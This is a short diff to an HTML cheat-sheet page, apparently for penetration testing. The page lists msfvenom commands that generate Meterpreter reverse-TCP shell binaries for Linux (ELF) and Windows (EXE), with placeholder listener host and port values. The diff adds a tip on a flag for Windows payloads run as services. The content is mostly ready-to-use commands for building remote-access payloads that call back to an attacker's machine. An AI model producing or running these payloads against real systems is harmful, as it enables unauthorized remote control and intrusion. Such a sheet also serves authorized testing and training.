@@ -6,6 +6,7 @@
 </head><body>Linux ELF binary:<br/>
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt; -f elf &gt; shell.elf<br/>
 <br/>
+For windows binaries, you can include the -k flag so that cmd.exe /k is used instead of cmd.exe. /k will create a new process. This is especially useful when using services.<br/>
 Windows EXE binary:<br/>
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;LIP&gt; LPORT=&lt;LPORT&gt;-f exe &gt; shell.exe<br/>
 <br/>
